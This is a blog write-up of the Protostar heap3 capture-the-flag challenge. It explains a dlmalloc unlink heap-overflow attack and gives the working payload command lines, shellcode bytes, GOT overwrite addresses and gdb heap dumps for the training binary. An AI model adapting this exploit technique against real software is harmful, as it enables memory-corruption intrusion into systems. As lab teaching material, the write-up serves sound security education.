---
layout: post
title: Protostar heap3 solution / writeup
date: 2012-12-22 01:52:05.000000000 -05:00
type: post
published: true
status: publish
categories:
- Writeups
tags:
- exploit
- exploitation
- heap
- protostar
- writeups
meta:
  _edit_last: '1'
author:
  login: csgadmin
  email: utdcsg@gmail.com
  display_name: csgadmin
  first_name: ''
  last_name: ''
---

    This is a writeup over protostar's heap3 exploitation challenge. Another member 
    wrote a writeup over this challenge as well, be sure to check that out as well :).

    We have 3 heap allocations: a, b and c. So on the heap we're going to have
    something similar to :

    [ a's header | data.... ] [ b's header | data.... ] [ c's header | data.... ]

    Given the 3 strcpy's, we can overwrite b and c however we choose. Since we're 
    using dlmalloc, and can completely control a chunk that is being free'd, we'll
    attack the UNLINK macro. This attack is written up completely in "Once upon a 
    free()" in phrack, http://www.phrack.org/issues.html?issue=57&id=9#article, so 
    this writeup is not a tutorial on the specific attack, rather it demonstrates 
    how to use the attack for this specific problem, heap3.

    We'll overwrite c's header data to unset c's PREV_INUSE flag, to trigger backwards
    consolidation. However, since we can't write null bytes, the previous size attribute
    of c will need to be negative value, 0xfffffff0. This will point relatively negative
    into c's data. So we'll trigger backwards consolidation, with a previous size of
    a negative value, pointing into c's data. This means we'll be creating a fake chunk
    inside of c's data.

    This fake chunk inside of c will have small values for the previous size and size
    attributes (setting the PREV_INUSE flag to 1, no more consolidation please), and
    the forward and backwards pointers will be completely in our control. This leverages
    the UNLINK macros :

      *(next->fd + 12) = next->bk
      *(next->bk + 8) = next->fd

    We will overwrite whatever forward+12 points to, with backward. However, then 
    backward+8 is overwritten with foward. *Important*, I originally just set :

    fw = GOT address of puts - 12
    bk = address of winner

    That works just fine, and puts will now call winner... *however*, winner+8 is a 
    function in the text section, we can't overwrite winner+8 with anything, because 
    this section of memory is not writeable. So... we can't point anything to winner, 
    because winner+8 is not writeable. Control flow must be sent to a writeable section of memory. Since we are already writting 3 buffers to the heap, which is writeable 
    (and executable in this case), and there is no ASLR, lets instead overwrite the 
    GOT address of puts with the address to one of our buffers. The buffer will then 
    have shellcode that calls winner.

    fw = GOT address fo puts - 12
    bk = address to shellcode inside of a's buffer

    The shellcode just needs one or two instructions, in this case I used : push address_of_winner, ret.

    Here is the overall diagram of what we'll be doing :


    The pieces of the puzzle we need :

    The GOT address of puts :

    user@protostar:/opt/protostar/bin$ objdump --dynamic-reloc ./heap3 | grep -i puts
    0804b128 R_386_JUMP_SLOT   puts

    The address of winner :

    (gdb) p winner
    $5 = {void (void)} 0x8048864 <winner>

    The shellcode we'll need :

    metasm > push 0x8048864
    "\x68\x64\x88\x04\x08"
    metasm > ret
    "\xc3"

    With all the pieces now, this is the exploit in action :

    # run the command
    (gdb) run $(python -c 'print "A"*4 + "\x68\x64\x88\x04\x08" + "\xc3" + "A"*22') $(python -c 'print "A"*32 + "\xf0\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "A"*8+"\xf1\xff\xff\xff"*2+"\x1c\xb1\x04\x08"+"\x0c\xc0\x04\x08"+"A"*8')

    # the part of free that we are leveraging for the overwrites
    1: x/5i $eip
    0x80498fd <free+217>:   mov    DWORD PTR [eax+0xc],edx
    0x8049900 <free+220>:   mov    eax,DWORD PTR [ebp-0x18]
    0x8049903 <free+223>:   mov    edx,DWORD PTR [ebp-0x14]
    0x8049906 <free+226>:   mov    DWORD PTR [eax+0x8],edx
    0x8049909 <free+229>:   mov    eax,DWORD PTR [ebp-0x38]

    # eax points to the GOT address of puts
    (gdb) i r eax
    eax            0x804b11c        134525212
    (gdb) x/xw 0x804b11c+12
    0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:   0x08048796

    # edx points to our buffer inside of a
    (gdb) i r edx
    edx            0x804c00c        134529036
    # which contains the shellcode
    (gdb) x/2i 0x804c00c
    0x804c00c:      push   0x8048864
    0x804c011:      ret
    (gdb) c
    Continuing.

    Breakpoint 6, 0x08048935 in main (argc=4, argv=0xbffff7e4) at heap3/heap3.c:28
    28      heap3/heap3.c: No such file or directory.
            in heap3/heap3.c
    # we're about to call puts
    1: x/5i $eip
    0x8048935 <main+172>:   call   0x8048790 <puts@plt>
    0x804893a <main+177>:   leave
    0x804893b <main+178>:   ret
    0x804893c <malloc_init_state>:  push   ebp
    0x804893d <malloc_init_state+1>:        mov    ebp,esp

    # what the heap looks like
    (gdb) x/40xw 0x804c008-8
    0x804c000:      0x00000000      0x00000029      0x0804c028      0x04886468  # a gets mangled in the beggining, so the sc starts at 0x0804c00c
    0x804c010:      0x4141c308      0x0804b11c      0x41414141      0x41414141
    0x804c020:      0x41414141      0x41414141      0x00000000      0x00000029  # b starts
    0x804c030:      0x00000000      0x41414141      0x41414141      0x41414141
    0x804c040:      0x41414141      0x41414141      0x41414141      0xffffffec
    0x804c050:      0xfffffff0      0xfffffffc      0x41414141      0x41414141  # b overwrites c's headers
    0x804c060:      0xfffffff1      0xffffffed      0x0804b194      0x0804b194  # c contains a fake chunk, header + fw and bk pointers
    0x804c070:      0x41414141      0x41414141      0x00000000      0x00000f89
    0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

    Continuing.
    that wasn't too bad now, was it? @ 1325256074

    Program exited with code 056.

    # and outside of gdb
    user@protostar:/opt/protostar/bin$ ./heap3 $(python -c 'print "A"*4 + "\x68\x64\x88\x04\x08" + "\xc3" + "A"*22') $(python -c 'print "A"*32 + "\xf0\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "A"*8+"\xf1\xff\xff\xff"*2+"\x1c\xb1\x04\x08"+"\x0c\xc0\x04\x08"+"A"*8')
    that wasn't too bad now, was it? @ 1325256161

    And a quick breakdown of the command used :

    arg1 = $(python -c 'print "A"*4 + "\x68\x64\x88\x04\x08" + "\xc3" + "A"*22') 
    - some padding that will get mangle'd by free
    - shellcode
    - more padding (no real need for trailing A's
    arg2 = $(python -c 'print "A"*32 + "\xf0\xff\xff\xff" + "\xfc\xff\xff\xff"') 
    - padding to reach c's header
    - overwrite c's header
    arg3 = $(python -c 'print "A"*8+"\xf1\xff\xff\xff"*2+"\x1c\xb1\x04\x08"+"\x0c\xc0\x04\x08"+"A"*8')
    - some padding
    - fake chunk header
    - fw
    - bk

    Happy exploiting :)
    Mitch
